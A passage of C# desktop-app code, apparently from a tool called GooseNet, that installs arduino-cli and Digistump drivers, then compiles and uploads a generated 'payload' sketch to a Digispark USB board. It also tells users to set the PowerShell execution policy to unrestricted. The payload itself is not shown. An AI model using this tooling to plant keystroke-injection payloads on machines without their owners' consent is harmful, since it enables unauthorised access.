                myProcess.StartInfo.UseShellExecute = true;
                myProcess.Start();
                e.Handled = true;
            }
        }
        private void PayloadUploadAutoButtonClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(payload_upload_options_canvas, 0);
            System.Windows.Controls.Panel.SetZIndex(payload_upload_auto_option_canvas, 1);
        }
        private void PayloadUploadAutoButtonBackClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(payload_upload_options_canvas, 1);
            System.Windows.Controls.Panel.SetZIndex(payload_upload_auto_option_canvas, 0);
        }
        private void ArduinoDownloadButtonClick(object sender, RoutedEventArgs e) {
            zip_down_button.IsEnabled = false;
            zip_down_button.Content = "Loading";
            zip_down_button.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, InstallStart);
        }
        private void InstallStart() {
            DownloadCLIZipAndUnpack();
            DownloadDriverZipAndUnpack();
            zip_down_button.IsEnabled = true;
            zip_down_button.Content = "Install";
        }
        private async void DownloadCLIZipAndUnpack() {
            if (File.Exists("../../../ThirdParty/arduino-cli/arduino-cli.exe")) {
                if (System.Windows.MessageBox.Show("arduino-cli.exe already exists. Would you like to overwrite it?", "File Exists", MessageBoxButton.YesNo, System.Windows.MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }           
            using var client = new HttpClient();
            using (var response = await client.GetAsync("https://downloads.arduino.cc/arduino-cli/arduino-cli_latest_Windows_64bit.zip"))
            using (var stream = await response.Content.ReadAsStreamAsync())
            using (var file = File.OpenWrite("../../../ThirdParty/arduino-cli.zip")) {
                stream.CopyTo(file);
            }    
            
            if (Directory.Exists("../../../ThirdParty/arduino-cli")) {
                Directory.Delete("../../../ThirdParty/arduino-cli",true);
            }

            ZipFile.ExtractToDirectory("../../../ThirdParty/arduino-cli.zip", "../../../ThirdParty/arduino-cli");
            System.Windows.MessageBox.Show("Arduino-cli extracted successfully");
        }
        private async void DownloadDriverZipAndUnpack() {
            if (File.Exists("../../../ThirdParty/digistump-drivers.zip")) {
                if (System.Windows.MessageBox.Show("digistump-drivers.zip already exists. Would you like to overwrite it?", "File Exists", MessageBoxButton.YesNo, System.Windows.MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }
            using var client = new HttpClient();
            using (var response = await client.GetAsync("https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip"))
            using (var stream = await response.Content.ReadAsStreamAsync())
            using (var file = File.OpenWrite("../../../ThirdParty/digistump-drivers.zip")) {
                stream.CopyTo(file);
            }

            if (Directory.Exists("../../../ThirdParty/Digistump Drivers")) {
                Directory.Delete("../../../ThirdParty/Digistump Drivers", true);
            }

            ZipFile.ExtractToDirectory("../../../ThirdParty/digistump-drivers.zip", "../../../ThirdParty/");
            System.Windows.MessageBox.Show("Digistump drivers extracted successfully");
        }
        private void InstallDriverClick(object sender, RoutedEventArgs e) {
            if (File.Exists("../../../ThirdParty/Digistump Drivers/DPinst64.exe")) {
                var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\Digistump Drivers\\DPinst64.exe");
                procStIfo.RedirectStandardOutput = true;
                procStIfo.UseShellExecute = false;
                procStIfo.CreateNoWindow = true;
                var proc = new Process();
                proc.StartInfo = procStIfo;
                proc.Start();
                proc.WaitForExit();
            } else {
                System.Windows.MessageBox.Show("../../../ThirdParty/Digistump Drivers/DPinst64.exe does not exist. Please run step (#1) to download and unpack drivers","Executeable doesn't exist",MessageBoxButton.OK,MessageBoxImage.Error);

            }

        }
        private void ArduinoCLIInitClick(object sender, RoutedEventArgs e) {
            //Commands to run from arduino-cli to make things functional.
            // .\arduino-cli core install
            
            if (!File.Exists("../../../ThirdParty/arduino-cli/arduino-cli.exe")) {
                System.Windows.MessageBox.Show("../../../ThirdParty/arduino-cli/arduino-cli.exe does not exist. Please run step (#1) to download and unpack drivers","Executeable doesn't exist",MessageBoxButton.OK,MessageBoxImage.Error);
            } else {
                ArduinoCLIUpdateIndex();
                ArduinoCLIClientInit();
                ArduinoCLIBoardConfigAdd();
                ArduinoCLIUpdateIndex();
                ArduinoCLICoreInstall();
                string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                
                if (Directory.Exists(localAppDataPath + "\\Arduino15\\packages\\digistump")) {
                    System.Windows.MessageBox.Show("Digistump AVR boards succesfully installed.");
                }
            }           
        }
        private void ArduinoCLIUpdateIndex() {
            Regex regex = new Regex(@".*(Downloading.*)");
            var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
            procStIfo.RedirectStandardOutput = true;
            procStIfo.UseShellExecute = false;
            procStIfo.CreateNoWindow = true;
            procStIfo.Arguments = "core update-index";
            var proc = new Process();
            proc.StartInfo = procStIfo;
            proc.Start();
            proc.WaitForExit();

            StreamReader reader = proc.StandardOutput;
            string output = reader.ReadToEnd();
            if (regex.IsMatch(output)) {
                System.Windows.MessageBox.Show(regex.Replace(output, "$1"));
            }

        }
        private void ArduinoCLIClientInit() {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Arduino15\\arduino-cli.yaml";
            var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
            procStIfo.RedirectStandardOutput = true;
            procStIfo.UseShellExecute = false;
            procStIfo.CreateNoWindow = true;
            procStIfo.Arguments = "config init";
            var proc = new Process();
            proc.StartInfo = procStIfo;


            if (File.Exists(path)) {
                if (System.Windows.MessageBox.Show("The arduino cli has already been configured. Would you like to overwrite previous configuration?", "Configuration Detected", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes) {
                    File.Delete(path);                    
                    proc.Start();
                    proc.WaitForExit();
                    var reader = proc.StandardOutput;
                    var output = reader.ReadToEnd();
                    System.Windows.MessageBox.Show(output);
                }
            } else {
                proc.Start();
                proc.WaitForExit();
                var reader = proc.StandardOutput;
                var output = reader.ReadToEnd();
                System.Windows.MessageBox.Show(output);
            }
        }
        private void ArduinoCLIBoardConfigAdd() {
            Regex re = new Regex(@"package_digistump_index.json");
            bool skip = false;
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Arduino15\\arduino-cli.yaml";
            if (File.Exists(path)) {
                string[] lines = System.IO.File.ReadAllLines(path);
                for (int i = 0; i < lines.Length; i++) {
                    if (re.IsMatch(lines[i])) {
                        skip = true;
                        break;
                    }
                }
            }
            if (!skip) {
                var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
                procStIfo.RedirectStandardOutput = true;
                procStIfo.UseShellExecute = false;
                procStIfo.CreateNoWindow = true;
                procStIfo.Arguments = "config add board_manager.additional_urls https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json";
                var proc = new Process();
                proc.StartInfo = procStIfo;
                proc.Start();
                proc.WaitForExit();
            } else {
                System.Windows.MessageBox.Show("skipped");
            }
        }
        private void ArduinoCLICoreInstall() {
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            if (Directory.Exists(localAppDataPath +"\\Arduino15\\packages\\digistump")) {
                if (System.Windows.MessageBox.Show("Digistump core boards already installed. Would you like to overwrite this installation?","Directory exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                } else {
                    var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
                    procStIfo.RedirectStandardOutput = true;
                    procStIfo.UseShellExecute = false;
                    procStIfo.CreateNoWindow = true;
                    procStIfo.Arguments = "core uninstall digistump:avr";
                    var proc = new Process();
                    proc.StartInfo = procStIfo;
                    proc.Start();
                    proc.WaitForExit();
                    Directory.Delete(localAppDataPath + "\\Arduino15\\packages\\digistump", true);


                    var procStIfo2 = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
                    procStIfo2.RedirectStandardOutput = true;
                    procStIfo2.UseShellExecute = false;
                    procStIfo2.CreateNoWindow = true;
                    procStIfo2.Arguments = "core install digistump:avr";
                    var proc2 = new Process();
                    proc2.StartInfo = procStIfo2;
                    proc2.Start();
                    proc2.WaitForExit();

                }
            } else {

                var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
                procStIfo.RedirectStandardOutput = true;
                procStIfo.UseShellExecute = false;
                procStIfo.CreateNoWindow = true;
                procStIfo.Arguments = "core install digistump:avr";
                var proc = new Process();
                proc.StartInfo = procStIfo;
                proc.Start();
                proc.WaitForExit();

            }

        }
        private void CompileAndUpload(object sender, RoutedEventArgs e) {
            if (!File.Exists("..\\..\\..\\payload_out\\payload_out.ino")) {
                System.Windows.MessageBox.Show("payload_out.ino file not found. Run \"Payload Options: Configure\" on the landing screen.", "File not found", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            if (!File.Exists("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe")) {
                System.Windows.MessageBox.Show("arduino-cli.exe does not exist. Run \"Payload Options -> Automated -> (#1)Install \"");
                return;
            }

            if (!CompileInoFile()) {
                System.Windows.MessageBox.Show("Error during ino file compile.");
                return;
            }
            UploadToDevice();
        }

        private bool CompileInoFile() {
            char[] delims = new[] { '\r', '\n' };
            Regex re = new Regex("Sketch uses");
            var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
            procStIfo.RedirectStandardOutput = true;
            procStIfo.UseShellExecute = false;
            procStIfo.CreateNoWindow = true;
            procStIfo.Arguments = "compile -b digistump:avr:digispark-tiny ..\\..\\..\\payload_out\\payload_out.ino";
            var proc = new Process();
            proc.StartInfo = procStIfo;
            proc.Start();
            proc.WaitForExit();
            StreamReader reader = proc.StandardOutput;
            string output = reader.ReadToEnd();
            string[] lines = output.Split(delims, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < lines.Length; i++) {
                if (re.IsMatch(output)) {
                    return true;
                }
            }
            return false;
        }
        private void UploadToDevice() {
            var procStIfo = new ProcessStartInfo("..\\..\\..\\ThirdParty\\arduino-cli\\arduino-cli.exe");
            procStIfo.RedirectStandardOutput = false;
            procStIfo.UseShellExecute = true;
            procStIfo.CreateNoWindow = false;
            procStIfo.Arguments = "upload -p COM3 -b digistump:avr:digispark-tiny ..\\..\\..\\payload_out\\payload_out.ino";
            var proc = new Process();
            proc.StartInfo = procStIfo;
            proc.Start();
            proc.WaitForExit();
        }


        //Misc
        private void StartGooseNetButtonClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(terms_of_service, 0);
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
        }
        private void TermsOfServiceCheckboxClick(object sender, RoutedEventArgs e) {
            if (service_agreement_auto_install_checkbox.IsChecked ?? true) {
                start_goosenet_button.IsEnabled = true;
            } else {
                start_goosenet_button.IsEnabled = false;
            }
        }

        private bool CheckExecutionPolicy() {
            Regex re = new Regex("Restricted");
            var procStIfo = new ProcessStartInfo("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            procStIfo.RedirectStandardOutput = true;
            procStIfo.UseShellExecute = false;
            procStIfo.CreateNoWindow = true;
            procStIfo.Arguments = "Get-ExecutionPolicy";
            var proc = new Process();
            proc.StartInfo = procStIfo;
            proc.Start();
            proc.WaitForExit();
            StreamReader reader = proc.StandardOutput;
            string output = reader.ReadToEnd();
            if (re.IsMatch(output)) {
                System.Windows.MessageBox.Show("System execution policies are set to restricted. Set to unrestricted and try again.");
                return false;
            }
            return true;
        }

        private void PreflightDirectoryChecks() {

            string[] keys = { "data","ThirdParty","scripts"};

            for (int i = 0; i < keys.Length; i++) {
                if (!Directory.Exists("../../../"+keys[i])) {
                    Directory.CreateDirectory("../../../" + keys[i]);
                }
            }
        }
    } 
}
